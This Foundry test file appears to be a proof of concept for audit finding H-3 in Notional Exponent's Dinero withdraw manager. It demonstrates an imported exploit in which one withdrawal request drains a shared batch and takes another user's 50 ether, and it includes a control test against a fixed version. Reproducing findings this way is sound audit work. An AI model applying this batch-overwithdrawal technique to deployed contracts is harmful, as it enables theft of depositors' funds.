// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {
    Exploit,
    PxETH,
    UpxETH,
    WETHc,
    PirexETHMock,
    DineroFixed,
    Victim
} from "./62484-h-3-dinerowithdrawrequestmanager-vulnerable-to-token-overw.sol";

// Notional Exponent H-3: DineroWithdrawRequestManager._finalizeWithdrawImpl claims the
// aggregate per-batch upxETH balance, not the per-request share. Two requests in the same
// batch → the first finalizer drains the whole batch, stealing the other request's tokens.
contract PoC_62484_DineroBatchOverlap is Test {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;
    uint256 internal constant DEPOSIT = 50 ether;
    uint256 internal constant BATCH = 5;

    function test_attacker_overwithdrawsSharedBatch() public {
        Exploit exp = new Exploit();
        vm.deal(address(exp), 2 * DEPOSIT);
        exp.run();

        WETHc weth = exp.weth();
        Victim victim = exp.victim();

        uint256 stolen = weth.balanceOf(SINK);
        uint256 attackerOwn = weth.balanceOf(address(exp));
        uint256 victimGot = weth.balanceOf(address(victim));

        emit log_named_decimal_uint("attacker total (own + stolen)", stolen + attackerOwn, 18);
        emit log_named_decimal_uint("stolen from victim (to sink) ", stolen, 18);
        emit log_named_decimal_uint("victim received              ", victimGot, 18);

        // The attacker drained the whole shared batch: 100 total (own 50 + victim's 50).
        assertEq(stolen + attackerOwn, 2 * DEPOSIT, "attacker did not drain the full batch");
        // Exactly the victim's 50 was stolen.
        assertEq(stolen, DEPOSIT, "stolen amount mismatch");
        // The victim's finalize returned nothing — batch already emptied.
        assertEq(victimGot, 0, "victim should have received nothing");
    }

    // Control: the fixed manager tracks the per-request contribution and claims only that,
    // so finalizing one request cannot drain another's share.
    function test_control_fixedClaimsPerRequestShare() public {
        vm.deal(address(this), 100 ether);

        PxETH px = new PxETH();
        UpxETH up = new UpxETH();
        WETHc w = new WETHc();
        PirexETHMock pirex = new PirexETHMock(px, up, BATCH);
        DineroFixed mgr = new DineroFixed(pirex, up, px, w);
        (bool ok,) = address(pirex).call{value: 100 ether}("");
        require(ok, "fund");

        px.mint(address(this), DEPOSIT);
        px.approve(address(mgr), DEPOSIT);
        uint256 reqA = mgr.initiateWithdraw(DEPOSIT);

        px.mint(address(this), DEPOSIT);
        px.approve(address(mgr), DEPOSIT);
        uint256 reqB = mgr.initiateWithdraw(DEPOSIT);

        uint256 claimedA = mgr.finalizeWithdraw(reqA);
        uint256 claimedB = mgr.finalizeWithdraw(reqB);

        emit log_named_decimal_uint("fixed claimed by request A", claimedA, 18);
        emit log_named_decimal_uint("fixed claimed by request B", claimedB, 18);

        // Each request claims exactly its own 50 — no draining of the other's share.
        assertEq(claimedA, DEPOSIT, "A must claim only its share");
        assertEq(claimedB, DEPOSIT, "B's share must remain claimable");
    }

    receive() external payable {}
}
